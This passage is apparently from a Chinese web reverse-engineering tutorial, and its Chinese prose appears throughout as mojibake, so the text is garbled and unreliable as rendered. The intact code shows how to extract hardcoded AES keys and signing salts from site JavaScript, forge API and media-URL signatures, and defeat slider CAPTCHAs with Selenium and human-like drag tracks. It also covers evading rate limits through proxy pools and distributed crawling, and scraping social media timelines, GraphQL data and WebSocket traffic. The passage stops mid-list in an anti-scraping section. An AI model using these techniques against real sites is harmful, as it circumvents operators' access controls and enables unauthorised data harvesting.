<p>æŸç”µå•†ç½‘ç«™çš„å•†å“åˆ—è¡¨é¡µï¼Œä»·æ ¼å­—æ®µè¿”å›çš„æ˜¯åŠ å¯†å­—ç¬¦ä¸²ï¼š</p>
<pre><code class="language-json">{
  &quot;product_id&quot;: 12345,
  &quot;name&quot;: &quot;iPhone 15&quot;,
  &quot;price_enc&quot;: &quot;U2FsdGVkX19Qx7...&quot;
}
</code></pre>
<p>æµè§ˆå™¨èƒ½æ­£å¸¸æ˜¾ç¤ºä»·æ ¼ï¼Œè¯´æ˜å‰ç«¯æœ‰è§£å¯†é€»è¾‘ã€‚</p>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. å®šä½è§£å¯†å‡½æ•°</h4>
<p><strong>æ–¹æ³•ä¸€ï¼šæœç´¢å…³é”®è¯</strong></p>
<pre><code class="language-javascript">// åœ¨ Sources é¢æ¿æœç´¢
&quot;price_enc&quot;;
&quot;decrypt&quot;;
&quot;AES&quot;;
</code></pre>
<p><strong>æ–¹æ³•äºŒï¼šDOM æ–­ç‚¹</strong></p>
<ol>
<li>å³é”®ä»·æ ¼å…ƒç´  -&gt; Inspect</li>
<li>å³é”® DOM èŠ‚ç‚¹ -&gt; Break on -&gt; subtree modifications</li>
<li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹ä¼šåœåœ¨ä¿®æ”¹ä»·æ ¼çš„ä»£ç å¤„</li>
</ol>
<h4>2. åˆ†æåŠ å¯†ç®—æ³•</h4>
<p>æ–­ç‚¹åœä¸‹åï¼Œè§‚å¯Ÿ Call Stackï¼š</p>
<pre><code>updatePrice()
  |- decryptPrice(encryptedPrice)
       |- CryptoJS.AES.decrypt(enc, key, {iv: iv})
</code></pre>
<p>å‘ç°ä½¿ç”¨äº† <strong>AES-CBC</strong> åŠ å¯†ï¼ŒKey å’Œ IV éƒ½åœ¨ JS ä¸­ç¡¬ç¼–ç ï¼š</p>
<pre><code class="language-javascript">function decryptPrice(enc) {
  var key = CryptoJS.enc.Utf8.parse(&quot;1234567890abcdef&quot;);
  var iv = CryptoJS.enc.Utf8.parse(&quot;abcdefghijklmnop&quot;);
  var decrypted = CryptoJS.AES.decrypt(enc, key, {
    iv: iv,
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
  });
  return decrypted.toString(CryptoJS.enc.Utf8);
}
</code></pre>
<h4>3. Python å®ç°</h4>
<pre><code class="language-python">from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def decrypt_price(price_enc):
    key = b'1234567890abcdef'
    iv = b'abcdefghijklmnop'

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = base64.b64decode(price_enc)
    decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    return decrypted.decode('utf-8')

# æµ‹è¯•
price_enc = &quot;U2FsdGVkX19Qx7...&quot;
print(decrypt_price(price_enc))  # &quot;ï¿¥5999&quot;
</code></pre>
<hr />
<h2>æ¡ˆä¾‹äºŒï¼šAPI ç­¾åé€†å‘</h2>
<h3>èƒŒæ™¯</h3>
<p>å•†å“æœç´¢æ¥å£éœ€è¦ç­¾åå‚æ•°ï¼š</p>
<pre><code>GET /api/search?q=iPhone&amp;page=1&amp;sign=abc123&amp;timestamp=1234567890
</code></pre>
<p>ä¸å¸¦ <code>sign</code> æˆ–ç­¾åé”™è¯¯éƒ½ä¼šè¿”å› 403ã€‚</p>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. å®šä½ç­¾åç”Ÿæˆ</h4>
<p><strong>XHR æ–­ç‚¹</strong>:</p>
<ol>
<li>Sources -&gt; XHR/fetch breakpoints</li>
<li>è¾“å…¥ <code>/api/search</code></li>
<li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹ä¼šåœ¨è¯·æ±‚å‘é€å‰åœä¸‹</li>
</ol>
<h4>2. åˆ†æç­¾åé€»è¾‘</h4>
<p>åœ¨ Call Stack ä¸­è¿½è¸ªï¼Œå‘ç°ç­¾åç”Ÿæˆå‡½æ•°ï¼š</p>
<pre><code class="language-javascript">function generateSign(params) {
  // 1. å‚æ•°æ’åº
  var keys = Object.keys(params).sort();

  // 2. æ‹¼æ¥å­—ç¬¦ä¸²
  var str = keys.map((k) =&gt; k + &quot;=&quot; + params[k]).join(&quot;&amp;&quot;);

  // 3. åŠ ç›
  str += &quot;&amp;key=my_secret_key_2023&quot;;

  // 4. MD5
  return md5(str);
}
</code></pre>
<p><strong>éªŒè¯</strong>:</p>
<pre><code class="language-javascript">generateSign({ q: &quot;iPhone&quot;, page: 1, timestamp: 1234567890 });
// &quot;e10adc3949ba59abbe56e057f20f883e&quot;
</code></pre>
<h4>3. Python å®ç°</h4>
<pre><code class="language-python">import hashlib
import time

def generate_sign(params):
    # å‚æ•°æ’åº
    sorted_params = sorted(params.items())

    # æ‹¼æ¥
    param_str = '&amp;'.join([f&quot;{k}={v}&quot; for k, v in sorted_params])

    # åŠ ç›
    sign_str = param_str + '&amp;key=my_secret_key_2023'

    # MD5
    return hashlib.md5(sign_str.encode()).hexdigest()

# ä½¿ç”¨
params = {
    'q': 'iPhone',
    'page': 1,
    'timestamp': int(time.time())
}
params['sign'] = generate_sign(params)

# å‘é€è¯·æ±‚
import requests
response = requests.get('https://example.com/api/search', params=params)
print(response.json())
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ä¸‰ï¼šæ»‘å—éªŒè¯ç </h2>
<h3>èƒŒæ™¯</h3>
<p>ç™»å½•æ—¶å‡ºç°æ»‘å—éªŒè¯ç ï¼Œéœ€è¦æ‹–åŠ¨æ»‘å—åˆ°æŒ‡å®šä½ç½®ã€‚</p>
<hr />
<h3>é€†å‘æ€è·¯</h3>
<h4>1. è½¨è¿¹ç”Ÿæˆ</h4>
<p>çœŸå®ç”¨æˆ·æ‹–åŠ¨æ»‘å—æ—¶ï¼Œè½¨è¿¹æ˜¯ä¸è§„åˆ™çš„ï¼ˆæœ‰åŠ é€Ÿã€å‡é€Ÿã€æŠ–åŠ¨ï¼‰ã€‚</p>
<p><strong>ç®€å•çš„çº¿æ€§è½¨è¿¹</strong>:</p>
<pre><code class="language-python">def generate_track(distance):
    track = []
    current = 0
    while current &lt; distance:
        step = min(5, distance - current)  # æ¯æ¬¡ç§»åŠ¨ 5px
        track.append(step)
        current += step
    return track
</code></pre>
<p><strong>æ¨¡æ‹ŸçœŸå®è½¨è¿¹</strong> (æ›´é«˜çº§):</p>
<pre><code class="language-python">import random

def generate_realistic_track(distance):
    track = []
    current = 0
    mid = distance * 0.8  # 80% å¤„å¼€å§‹å‡é€Ÿ

    while current &lt; distance:
        if current &lt; mid:
            # åŠ é€Ÿé˜¶æ®µ
            step = random.randint(5, 10)
        else:
            # å‡é€Ÿé˜¶æ®µ
            step = random.randint(2, 5)

        if current + step &gt; distance:
            step = distance - current

        track.append(step)
        current += step

        # éšæœºæŠ–åŠ¨
        if random.random() &lt; 0.2:
            track.append(-random.randint(1, 2))
            current -= track[-1]

    return track
</code></pre>
<h4>2. Selenium æ¨¡æ‹Ÿ</h4>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
driver.get('https://example.com/login')

# ç­‰å¾…æ»‘å—åŠ è½½
slider = driver.find_element(By.CLASS_NAME, 'slider-button')

# ç”Ÿæˆè½¨è¿¹
distance = 260  # éœ€è¦ç§»åŠ¨çš„è·ç¦»ï¼ˆåƒç´ ï¼‰
track = generate_realistic_track(distance)

# æ‰§è¡Œæ‹–åŠ¨
ActionChains(driver).click_and_hold(slider).perform()
for step in track:
    ActionChains(driver).move_by_offset(step, 0).perform()
    time.sleep(random.uniform(0.001, 0.003))  # æ¨¡æ‹Ÿäººç±»å»¶è¿Ÿ

ActionChains(driver).release().perform()
</code></pre>
<hr />
<h2>æ¡ˆä¾‹å››ï¼šé™æµä¸åçˆ¬</h2>
<h3>èƒŒæ™¯</h3>
<p>é¢‘ç¹è¯·æ±‚ä¼šè§¦å‘é™æµï¼š</p>
<ul>
<li>å• IP æ¯åˆ†é’Ÿæœ€å¤š 60 æ¬¡è¯·æ±‚</li>
<li>è¶…è¿‡åè¿”å› 429 Too Many Requests</li>
</ul>
<hr />
<h3>ç»•è¿‡ç­–ç•¥</h3>
<h4>1. é™ä½è¯·æ±‚é¢‘ç‡</h4>
<pre><code class="language-python">import time

for page in range(1, 100):
    response = requests.get(f'https://example.com/api/products?page={page}')
    print(response.json())

    # ä¼‘çœ  1-3 ç§’
    time.sleep(random.uniform(1, 3))
</code></pre>
<h4>2. ä½¿ç”¨ä»£ç†æ± </h4>
<pre><code class="language-python">proxies_list = [
    {'http': 'http://proxy1:port'},
    {'http': 'http://proxy2:port'},
    # ...
]

for page in range(1, 100):
    proxy = random.choice(proxies_list)
    response = requests.get(
        f'https://example.com/api/products?page={page}',
        proxies=proxy
    )
</code></pre>
<h4>3. åˆ†å¸ƒå¼çˆ¬å–</h4>
<p>ä½¿ç”¨ Scrapy + Redis å®ç°åˆ†å¸ƒå¼ï¼š</p>
<ul>
<li>å¤šå°æœåŠ¡å™¨åŒæ—¶çˆ¬å–</li>
<li>Redis å­˜å‚¨ä»»åŠ¡é˜Ÿåˆ—å’Œå»é‡</li>
<li>æ¯å°æœåŠ¡å™¨ç‹¬ç«‹ IP</li>
</ul>
<hr />
<h2>æ€»ç»“</h2>
<p>ç”µå•†ç½‘ç«™é€†å‘çš„æ ¸å¿ƒæŒ‘æˆ˜ï¼š</p>
<ol>
<li><strong>åŠ å¯†ç®—æ³•</strong>: ä»·æ ¼ã€åº“å­˜ç­‰æ•æ„Ÿæ•°æ®åŠ å¯†</li>
<li><strong>API ç­¾å</strong>: é˜²æ­¢å‚æ•°ç¯¡æ”¹</li>
<li><strong>éªŒè¯ç </strong>: æ»‘å—ã€ç‚¹é€‰ã€è¡Œä¸ºéªŒè¯</li>
<li><strong>é™æµ</strong>: IP å°ç¦ã€é¢‘ç‡é™åˆ¶</li>
</ol>
<p><strong>åº”å¯¹ç­–ç•¥</strong>:</p>
<ul>
<li>é™æ€åˆ†æ + åŠ¨æ€è°ƒè¯•å®šä½åŠ å¯†é€»è¾‘</li>
<li>Hook å…³é”®å‡½æ•°éªŒè¯ç®—æ³•</li>
<li>ä½¿ç”¨ä»£ç†æ± ã€é™ä½é¢‘ç‡é¿å…å°ç¦</li>
<li>Selenium/Puppeteer åº”å¯¹å¤æ‚éªŒè¯ç </li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-28">API æ¥å£é€†å‘</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-33">éªŒè¯ç è¯†åˆ«ä¸ç»•è¿‡</a></li>
<li><a href="#section-52">ä»£ç†æ± ç®¡ç†</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-46">
                                                <h2>[R45] Social Media</h2>
                                                <h1>R45: ç¤¾äº¤åª’ä½“é€†å‘æ¡ˆä¾‹</h1>
<h2>æ¦‚è¿°</h2>
<p>ç¤¾äº¤åª’ä½“å¹³å°é€šå¸¸åŒ…å«å¤æ‚çš„ API è°ƒç”¨ã€æ— é™æ»šåŠ¨åŠ è½½ã€å®æ—¶é€šä¿¡ã€å†…å®¹æ¨èç®—æ³•ç­‰ã€‚æœ¬æ–‡é€šè¿‡çœŸå®æ¡ˆä¾‹ä»‹ç»ç¤¾äº¤åª’ä½“å¹³å°çš„é€†å‘åˆ†ææŠ€å·§ã€‚</p>
<hr />
<h2>æ¡ˆä¾‹ä¸€ï¼šå¾®åš/Twitter æ— é™æ»šåŠ¨åˆ†é¡µ</h2>
<h3>èƒŒæ™¯</h3>
<p>ç¤¾äº¤åª’ä½“çš„ä¿¡æ¯æµé€šå¸¸é‡‡ç”¨æ— é™æ»šåŠ¨ï¼ˆInfinite Scrollï¼‰æ–¹å¼åŠ è½½ï¼š</p>
<ul>
<li>ç”¨æˆ·æ»šåŠ¨åˆ°åº•éƒ¨æ—¶è‡ªåŠ¨åŠ è½½ä¸‹ä¸€é¡µ</li>
<li>ä¸ä½¿ç”¨ä¼ ç»Ÿçš„ <code>page=1,2,3</code> åˆ†é¡µ</li>
<li>ä½¿ç”¨æ¸¸æ ‡ï¼ˆcursorï¼‰æˆ–æœ€åä¸€æ¡ ID ä½œä¸ºåˆ†é¡µæ ‡è¯†</li>
</ul>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æ</h4>
<p>æ»šåŠ¨åˆ°åº•éƒ¨ï¼Œè§‚å¯Ÿ Network é¢æ¿çš„ XHR è¯·æ±‚ï¼š</p>
<pre><code class="language-http">GET /api/timeline?max_id=1234567890&amp;count=20 HTTP/1.1
</code></pre>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>max_id</code>: å½“å‰é¡µæœ€åä¸€æ¡å¾®åšçš„ ID</li>
<li><code>count</code>: æ¯é¡µæ•°é‡</li>
</ul>
<p>å“åº”ç»“æ„ï¼š</p>
<pre><code class="language-json">{
    &quot;data&quot;: [
        {
            &quot;id&quot;: &quot;1234567890&quot;,
            &quot;text&quot;: &quot;å¾®åšå†…å®¹...&quot;,
            &quot;user&quot;: {...},
            &quot;created_at&quot;: &quot;2023-12-17 10:00:00&quot;
        },
        // æ›´å¤šå¾®åš...
    ],
    &quot;next_cursor&quot;: &quot;1234567850&quot;  // ä¸‹ä¸€é¡µçš„ cursor
}
</code></pre>
<h4>2. Python å®ç°çˆ¬å–</h4>
<pre><code class="language-python">import requests
import time

class WeiboScraper:
    def __init__(self, cookie):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0...',
            'Cookie': cookie,
            'Referer': 'https://weibo.com/'
        })
        self.base_url = 'https://weibo.com/api/timeline'

    def fetch_timeline(self, max_id=None, count=20):
        &quot;&quot;&quot;è·å–æ—¶é—´çº¿&quot;&quot;&quot;
        params = {'count': count}
        if max_id:
            params['max_id'] = max_id

        response = self.session.get(self.base_url, params=params)
        return response.json()

    def scrape_all(self, max_pages=10):
        &quot;&quot;&quot;çˆ¬å–å¤šé¡µ&quot;&quot;&quot;
        all_posts = []
        next_cursor = None

        for page in range(max_pages):
            print(f'Fetching page {page + 1}...')

            data = self.fetch_timeline(max_id=next_cursor)

            posts = data.get('data', [])
            all_posts.extend(posts)

            # è·å–ä¸‹ä¸€é¡µæ¸¸æ ‡
            next_cursor = data.get('next_cursor')
            if not next_cursor:
                print('No more data')
                break

            # ç¤¼è²Œå»¶è¿Ÿ
            time.sleep(2)

        return all_posts

# ä½¿ç”¨
scraper = WeiboScraper(cookie='YOUR_COOKIE_HERE')
posts = scraper.scrape_all(max_pages=5)

for post in posts:
    print(f&quot;[{post['id']}] {post['text']}&quot;)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹äºŒï¼šInstagram/æŠ–éŸ³å›¾ç‰‡/è§†é¢‘ URL è§£å¯†</h2>
<h3>èƒŒæ™¯</h3>
<p>ç¤¾äº¤åª’ä½“å¹³å°çš„å›¾ç‰‡/è§†é¢‘ URL é€šå¸¸ç»è¿‡åŠ å¯†æˆ–ç­¾åï¼š</p>
<ul>
<li>é˜²æ­¢ç›´æ¥ä¸‹è½½</li>
<li>é˜²æ­¢ç›—é“¾</li>
<li>æ·»åŠ æ—¶æ•ˆæ€§ï¼ˆURL åœ¨ä¸€å®šæ—¶é—´åå¤±æ•ˆï¼‰</li>
</ul>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. è§‚å¯Ÿå›¾ç‰‡åŠ è½½</h4>
<p>åœ¨ Network é¢æ¿ä¸­è§‚å¯Ÿå›¾ç‰‡è¯·æ±‚ï¼š</p>
<pre><code class="language-http">GET /img/v2/abc123?sig=def456&amp;ts=1702800000 HTTP/1.1
</code></pre>
<p>å‚æ•°ï¼š</p>
<ul>
<li><code>sig</code>: ç­¾å</li>
<li><code>ts</code>: æ—¶é—´æˆ³</li>
</ul>
<h4>2. å®šä½ç­¾åç”Ÿæˆå‡½æ•°</h4>
<p>åœ¨ Sources é¢æ¿æœç´¢ <code>sig</code> æˆ– <code>signature</code>ï¼Œæ‰¾åˆ°ç”Ÿæˆé€»è¾‘ï¼š</p>
<pre><code class="language-javascript">function generateImageSignature(imageId, timestamp) {
  // æ‹¼æ¥å­—ç¬¦ä¸²
  const str = `${imageId}:${timestamp}:${SECRET_SALT}`;

  // MD5 ç­¾å
  return md5(str);
}

// ä½¿ç”¨
const imageId = &quot;abc123&quot;;
const timestamp = Math.floor(Date.now() / 1000);
const sig = generateImageSignature(imageId, timestamp);

const imageUrl = `/img/v2/${imageId}?sig=${sig}&amp;ts=${timestamp}`;
</code></pre>
<p><strong>å¯†é’¥æå–</strong>:</p>
<pre><code class="language-javascript">// æœç´¢ &quot;SECRET_SALT&quot; æˆ–ç¡¬ç¼–ç çš„å­—ç¬¦ä¸²
const SECRET_SALT = &quot;my_secret_key_2023&quot;;
</code></pre>
<h4>3. Python å®ç°</h4>
<pre><code class="language-python">import hashlib
import time

class MediaDownloader:
    SECRET_SALT = &quot;my_secret_key_2023&quot;  # ä» JS ä¸­æå–

    def generate_signature(self, media_id, timestamp):
        &quot;&quot;&quot;ç”Ÿæˆç­¾å&quot;&quot;&quot;
        str_to_sign = f&quot;{media_id}:{timestamp}:{self.SECRET_SALT}&quot;
        return hashlib.md5(str_to_sign.encode()).hexdigest()

    def get_media_url(self, media_id):
        &quot;&quot;&quot;ç”Ÿæˆæœ‰ç­¾åçš„åª’ä½“ URL&quot;&quot;&quot;
        timestamp = int(time.time())
        sig = self.generate_signature(media_id, timestamp)

        return f&quot;https://example.com/img/v2/{media_id}?sig={sig}&amp;ts={timestamp}&quot;

    def download(self, media_id, save_path):
        &quot;&quot;&quot;ä¸‹è½½åª’ä½“&quot;&quot;&quot;
        url = self.get_media_url(media_id)
        response = requests.get(url)

        with open(save_path, 'wb') as f:
            f.write(response.content)

        print(f'Downloaded to {save_path}')

# ä½¿ç”¨
downloader = MediaDownloader()
downloader.download('abc123', 'image.jpg')
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ä¸‰ï¼šGraphQL API é€†å‘</h2>
<h3>èƒŒæ™¯</h3>
<p>ç°ä»£ç¤¾äº¤åª’ä½“ï¼ˆå¦‚ Facebook, Instagram, GitHubï¼‰ä½¿ç”¨ GraphQL è€Œé REST APIï¼š</p>
<ul>
<li>å•ä¸ªç«¯ç‚¹å¤„ç†æ‰€æœ‰è¯·æ±‚</li>
<li>å®¢æˆ·ç«¯æŒ‡å®šéœ€è¦çš„å­—æ®µ</li>
<li>å¤æ‚çš„æŸ¥è¯¢ç»“æ„</li>
</ul>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æ GraphQL è¯·æ±‚</h4>
<pre><code class="language-http">POST /graphql HTTP/1.1
Content-Type: application/json

{
    &quot;query&quot;: &quot;query UserTimeline($userId: ID!, $first: Int!) { user(id: $userId) { posts(first: $first) { edges { node { id text created_at likes { count } } } } } }&quot;,
    &quot;variables&quot;: {
        &quot;userId&quot;: &quot;12345&quot;,
        &quot;first&quot;: 20
    }
}
</code></pre>
<h4>2. ç†è§£æŸ¥è¯¢ç»“æ„</h4>
<p>æŸ¥è¯¢æ ¼å¼åŒ–åï¼š</p>
<pre><code class="language-graphql">query UserTimeline($userId: ID!, $first: Int!) {
  user(id: $userId) {
    posts(first: $first) {
      edges {
        node {
          id
          text
          created_at
          likes {
            count
          }
        }
      }
    }
  }
}
</code></pre>
<h4>3. Python å®ç°</h4>
<pre><code class="language-python">import requests

class GraphQLClient:
    def __init__(self, endpoint, token):
        self.endpoint = endpoint
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }

    def query(self, query_string, variables=None):
        &quot;&quot;&quot;æ‰§è¡Œ GraphQL æŸ¥è¯¢&quot;&quot;&quot;
        payload = {'query': query_string}
        if variables:
            payload['variables'] = variables

        response = requests.post(
            self.endpoint,
            json=payload,
            headers=self.headers
        )

        return response.json()

    def get_user_posts(self, user_id, first=20):
        &quot;&quot;&quot;è·å–ç”¨æˆ·å¸–å­&quot;&quot;&quot;
        query = &quot;&quot;&quot;
        query UserTimeline($userId: ID!, $first: Int!) {
          user(id: $userId) {
            posts(first: $first) {
              edges {
                node {
                  id
                  text
                  created_at
                  likes {
                    count
                  }
                  comments {
                    count
                  }
                }
              }
            }
          }
        }
        &quot;&quot;&quot;

        variables = {
            'userId': user_id,
            'first': first
        }

        return self.query(query, variables)

# ä½¿ç”¨
client = GraphQLClient(
    endpoint='https://example.com/graphql',
    token='YOUR_TOKEN_HERE'
)

result = client.get_user_posts(user_id='12345', first=50)

# è§£æç»“æœ
posts = result['data']['user']['posts']['edges']
for edge in posts:
    post = edge['node']
    print(f&quot;[{post['id']}] {post['text']}&quot;)
    print(f&quot;Likes: {post['likes']['count']}, Comments: {post['comments']['count']}&quot;)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹å››ï¼šå®æ—¶é€šçŸ¥ä¸ WebSocket</h2>
<h3>èƒŒæ™¯</h3>
<p>ç¤¾äº¤åª’ä½“çš„å®æ—¶é€šçŸ¥ï¼ˆæ–°æ¶ˆæ¯ã€ç‚¹èµã€è¯„è®ºï¼‰é€šå¸¸ä½¿ç”¨ WebSocketï¼š</p>
<ul>
<li>åŒå‘é€šä¿¡</li>
<li>æœåŠ¡å™¨ä¸»åŠ¨æ¨é€</li>
<li>ä¿æŒé•¿è¿æ¥</li>
</ul>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. è§‚å¯Ÿ WebSocket è¿æ¥</h4>
<p>åœ¨ Network é¢æ¿çš„ WS æ ‡ç­¾ä¸­æŸ¥çœ‹ï¼š</p>
<pre><code class="language-javascript">// è¿æ¥å»ºç«‹
ws://example.com/ws?token=abc123&amp;userId=12345

// æ¥æ”¶æ¶ˆæ¯
{
    &quot;type&quot;: &quot;notification&quot;,
    &quot;data&quot;: {
        &quot;id&quot;: &quot;notify_123&quot;,
        &quot;type&quot;: &quot;like&quot;,
        &quot;from_user&quot;: &quot;user_456&quot;,
        &quot;post_id&quot;: &quot;post_789&quot;,
        &quot;timestamp&quot;: 1702800000
    }
}

// å‘é€æ¶ˆæ¯ï¼ˆå¿ƒè·³ï¼‰
{
    &quot;type&quot;: &quot;ping&quot;,
    &quot;timestamp&quot;: 1702800000
}
</code></pre>
<h4>2. Hook WebSocket</h4>
<pre><code class="language-javascript">// Hook WebSocket æ„é€ å‡½æ•°
const OriginalWebSocket = window.WebSocket;
window.WebSocket = function (url, protocols) {
  console.log(&quot;[WebSocket] Connecting to:&quot;, url);

  const ws = new OriginalWebSocket(url, protocols);

  // Hook onmessage
  const originalOnMessage = ws.onmessage;
  ws.onmessage = function (event) {
    console.log(&quot;[WebSocket] Received:&quot;, event.data);
    if (originalOnMessage) {
      originalOnMessage.call(this, event);
    }
  };

  // Hook send
  const originalSend = ws.send;
  ws.send = function (data) {
    console.log(&quot;[WebSocket] Sending:&quot;, data);
    return originalSend.call(this, data);
  };

  return ws;
};
</code></pre>
<h4>3. Python å®ç° WebSocket å®¢æˆ·ç«¯</h4>
<pre><code class="language-python">import websocket
import json
import threading
import time

class SocialMediaWS:
    def __init__(self, token, user_id):
        self.token = token
        self.user_id = user_id
        self.ws = None
        self.running = False

    def on_message(self, ws, message):
        &quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å›è°ƒ&quot;&quot;&quot;
        data = json.loads(message)
        print(f'[Received] {data}')

        if data['type'] == 'notification':
            self.handle_notification(data['data'])

    def on_error(self, ws, error):
        &quot;&quot;&quot;é”™è¯¯å›è°ƒ&quot;&quot;&quot;
        print(f'[Error] {error}')

    def on_close(self, ws, close_status_code, close_msg):
        &quot;&quot;&quot;å…³é—­å›è°ƒ&quot;&quot;&quot;
        print(f'[Closed] Code: {close_status_code}, Message: {close_msg}')
        self.running = False

    def on_open(self, ws):
        &quot;&quot;&quot;è¿æ¥å»ºç«‹å›è°ƒ&quot;&quot;&quot;
        print('[Connected]')
        self.running = True

        # å¯åŠ¨å¿ƒè·³çº¿ç¨‹
        threading.Thread(target=self.send_heartbeat, daemon=True).start()

    def send_heartbeat(self):
        &quot;&quot;&quot;å‘é€å¿ƒè·³&quot;&quot;&quot;
        while self.running:
            if self.ws:
                ping_msg = json.dumps({
                    'type': 'ping',
                    'timestamp': int(time.time())
                })
                self.ws.send(ping_msg)
                print('[Heartbeat] Sent')

            time.sleep(30)  # æ¯30ç§’ä¸€æ¬¡

    def handle_notification(self, data):
        &quot;&quot;&quot;å¤„ç†é€šçŸ¥&quot;&quot;&quot;
        notif_type = data['type']
        if notif_type == 'like':
            print(f&quot;User {data['from_user']} liked your post {data['post_id']}&quot;)
        elif notif_type == 'comment':
            print(f&quot;User {data['from_user']} commented on your post&quot;)
        elif notif_type == 'follow':
            print(f&quot;User {data['from_user']} followed you&quot;)

    def connect(self):
        &quot;&quot;&quot;å»ºç«‹è¿æ¥&quot;&quot;&quot;
        url = f&quot;ws://example.com/ws?token={self.token}&amp;userId={self.user_id}&quot;

        self.ws = websocket.WebSocketApp(
            url,
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close
        )

        # è¿è¡Œï¼ˆé˜»å¡ï¼‰
        self.ws.run_forever()

    def disconnect(self):
        &quot;&quot;&quot;æ–­å¼€è¿æ¥&quot;&quot;&quot;
        self.running = False
        if self.ws:
            self.ws.close()

# ä½¿ç”¨
ws_client = SocialMediaWS(token='YOUR_TOKEN', user_id='12345')
ws_client.connect()  # é˜»å¡è¿è¡Œ
</code></pre>
<hr />
<h2>æ¡ˆä¾‹äº”ï¼šæ¨èç®—æ³•å‚æ•°é€†å‘</h2>
<h3>èƒŒæ™¯</h3>
<p>ç¤¾äº¤åª’ä½“çš„æ¨èç®—æ³•ä¼šæ ¹æ®ç”¨æˆ·è¡Œä¸ºè°ƒæ•´å†…å®¹ï¼š</p>
<ul>
<li>ç‚¹èµã€è¯„è®ºã€åˆ†äº«</li>
<li>åœç•™æ—¶é—´</li>
<li>æ»šåŠ¨é€Ÿåº¦</li>
<li>äº¤äº’é¢‘ç‡</li>
</ul>
<p>è¿™äº›æ•°æ®é€šè¿‡ API å‘é€åˆ°æœåŠ¡å™¨ã€‚</p>
<hr />
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æè¡Œä¸ºä¸ŠæŠ¥</h4>
<pre><code class="language-http">POST /api/behavior HTTP/1.1
Content-Type: application/json

{
    &quot;session_id&quot;: &quot;sess_123&quot;,
    &quot;events&quot;: [
        {
            &quot;type&quot;: &quot;view&quot;,
            &quot;post_id&quot;: &quot;post_789&quot;,
            &quot;duration&quot;: 5.2,  // åœç•™æ—¶é—´ï¼ˆç§’ï¼‰
            &quot;timestamp&quot;: 1702800000
        },
        {
            &quot;type&quot;: &quot;like&quot;,
            &quot;post_id&quot;: &quot;post_789&quot;,
            &quot;timestamp&quot;: 1702800005
        },
        {
            &quot;type&quot;: &quot;share&quot;,
            &quot;post_id&quot;: &quot;post_789&quot;,
            &quot;platform&quot;: &quot;wechat&quot;,
            &quot;timestamp&quot;: 1702800010
        }
    ]
}
</code></pre>
<h4>2. å®šä½è¡Œä¸ºè¿½è¸ªä»£ç </h4>
<pre><code class="language-javascript">// è¿½è¸ªå¸–å­æµè§ˆ
const observer = new IntersectionObserver((entries) =&gt; {
  entries.forEach((entry) =&gt; {
    if (entry.isIntersecting) {
      const postId = entry.target.dataset.postId;
      const viewStart = Date.now();

      // è®°å½•å¼€å§‹æ—¶é—´
      viewTimers[postId] = viewStart;
    } else {
      const postId = entry.target.dataset.postId;
      if (viewTimers[postId]) {
        const duration = (Date.now() - viewTimers[postId]) / 1000;

        // ä¸ŠæŠ¥æµè§ˆäº‹ä»¶
        trackEvent({
          type: &quot;view&quot;,
          post_id: postId,
          duration: duration,
        });

        delete viewTimers[postId];
      }
    }
  });
});

// ç›‘å¬æ‰€æœ‰å¸–å­
document.querySelectorAll(&quot;.post&quot;).forEach((post) =&gt; {
  observer.observe(post);
});

// è¿½è¸ªç‚¹èµ
function handleLike(postId) {
  trackEvent({
    type: &quot;like&quot;,
    post_id: postId,
    timestamp: Date.now(),
  });

  // å®é™…çš„ç‚¹èµè¯·æ±‚
  fetch(&quot;/api/like&quot;, {
    method: &quot;POST&quot;,
    body: JSON.stringify({ post_id: postId }),
  });
}
</code></pre>
<h4>3. æ‰¹é‡ä¸ŠæŠ¥ä¼˜åŒ–</h4>
<pre><code class="language-javascript">// æ‰¹é‡æ”¶é›†äº‹ä»¶
let eventQueue = [];

function trackEvent(event) {
  event.timestamp = Date.now();
  eventQueue.push(event);

  // è¾¾åˆ°é˜ˆå€¼æˆ–è¶…æ—¶åæ‰¹é‡å‘é€
  if (eventQueue.length &gt;= 10) {
    flushEvents();
  }
}

function flushEvents() {
  if (eventQueue.length === 0) return;

  fetch(&quot;/api/behavior&quot;, {
    method: &quot;POST&quot;,
    headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
    body: JSON.stringify({
      session_id: sessionId,
      events: eventQueue,
    }),
  });

  eventQueue = [];
}

// å®šæ—¶åˆ·æ–°
setInterval(flushEvents, 30000); // æ¯30ç§’

// é¡µé¢å¸è½½æ—¶å‘é€
window.addEventListener(&quot;beforeunload&quot;, flushEvents);
</code></pre>
<hr />
<h2>åçˆ¬è™«å¯¹æŠ—</h2>
<h3>å¸¸è§æ£€æµ‹æ‰‹æ®µ</h3>
<ol>
